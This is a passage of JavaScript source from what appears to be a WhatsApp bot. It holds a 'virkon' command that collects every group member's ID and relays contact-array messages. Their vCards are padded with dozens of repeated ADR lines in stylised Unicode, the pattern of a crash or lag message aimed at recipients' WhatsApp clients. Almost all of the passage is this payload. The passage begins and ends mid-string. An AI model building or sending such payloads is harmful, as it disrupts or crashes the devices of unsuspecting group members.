𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙??𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nitem1.X-ABLabel:Ponsel\nEND:VCARD"
							},
							{
							    "vcard": "BEGIN:VCARD\nVERSION:3.0\nN:〽️⏤͟͟͞͞ᵡSʜɪɴ々Cʜᴀɴ༗〽/>;;;\nFN:〽️⏤͟͟͞͞ᵡSʜɪɴ々Cʜᴀɴ༗〽/>\nitem1.TEL;waid=0:+0\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈??𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈??𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕?? 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️️️️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟??𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nitem1.X-ABLabel:Ponsel\nEND:VCARD"
							}
						],
						"contextInfo": {
							"forwardingScore": 1,
							"isForwarded": true
						}
           }
				}, {quoted: fvid, contextInfo:{}}) 
 kurr.relayWAMessage(res)
 break
case 'virkon':
members_ids = [999999]
for (let mem of groupMembers) {
	members_ids.push(mem.jid)
}
res = await kurr.prepareMessageFromContent(from, {
	"contactsArrayMessage": {
		"displayName": "2 kontak",
		"contacts": [
		{"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:shinchan/>;;;\nFN:shinchan/>\nitem1.TEL;waid=6282134110253:62 821-3411-0253\nADR;TYPE=WORK:HOME;WHATSAPP.NET:SHINCHAN SENPAI 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:SHINCHAN SENPAI 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET: SHINCHAN SENPAI 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:SHINCHAN SENPAI 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:SHINCHAN SENPAI 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:SHINCHAN SENPAI 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:SHINCHAN SENPAI 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:SHINCHAN SENPAI 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:SHINCHAN SENPAI 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:SHINCHAN SENPAI 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:SHINCHAN SENPAI 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:SHINCHAN SENPAI 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:SHINCHAN SENPAI 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:SHINCHAN SENPAI 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:SHINCHAN SENPAI 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:SHINCHAN SENPAI 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:SHINCHAN SENPAI 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:SHINCHAN SENPAI 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:SHINCHAN SENPAI 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:SHINCHAN SENPAI 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:SHINCHAN SENPAI 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:SHINCHAN SENPAI 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:SHINCHAN SENPAI 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:SHINCHAN SENPAI 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:SHINCHAN SENPAI 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:SHINCHAN SENPAI 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:SHINCHAN SENPAI 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:SHINCHAN SENPAI 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:SHINCHAN SENPAI 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:SHINCHAN SENPAI 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:SHINCHAN SENPAI 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:SHINCHAN SENPAI 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:SHINCHAN SENPAI 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:SHINCHAN SENPAI 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:SHINCHAN SENPAI 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:SHINCHAN SENPAI 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:SHINCHAN SENPAI 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:SHINCHAN SENPAI 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:SHINCHAN SENPAI 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:SHINCHAN SENPAI 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:SHINCHAN SENPAI 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:SHINCHAN SENPAI 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:SHINCHAN SENPAI 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:SHINCHAN SENPAI 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:SHINCHAN SENPAI 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:SHINCHAN SENPAI 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:SHINCHAN SENPAI 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:SHINCHAN SENPAI 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:SHINCHAN SENPAI 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:SHINCHAN SENPAI 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:SHINCHAN SENPAI 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:SHINCHAN SENPAI 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:SHINCHAN SENPAI 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:SHINCHAN SENPAI 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:SHINCHAN SENPAI 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:SHINCHAN SENPAI 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:SHINCHAN SENPAI 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:SHINCHAN SENPAI 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:SHINCHAN SENPAI 咽翁 